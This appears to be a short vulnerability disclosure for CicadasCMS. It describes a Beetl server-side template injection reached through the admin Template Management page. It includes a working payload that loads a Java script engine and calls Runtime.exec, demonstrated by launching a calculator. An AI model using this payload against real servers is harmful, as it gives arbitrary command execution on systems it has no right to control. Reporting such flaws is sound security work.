 Project Address:  [https://gitee.com/westboy/CicadasCMS](https://gitee.com/westboy/CicadasCMS)

<h3 id="s8G7H"> There is a Server-Side Template Injection vulnerability that leads to command execution.  </h3>
beetl Template vulnerability.

 Click on "System Management," then click on "Template Management," select a template (here it is index.html), and then input the following payload.  

```java
a href="${@Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("").eval("java.lang.Runtime.getRuntime().exec(calc);")}"></a>
```

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1739344692374-bcfbe9a1-d5fd-4c5c-9536-1f1c234bb9f8.png) Access `localhost:8081/index.html`。 The page will pop up a **calculator**, resulting in command execution.  

![](https://cdn.nlark.com/yuque/0/2025/png/50620181/1739344716760-581c9a9b-ea20-4cd8-90cf-301e8eebc9df.png)







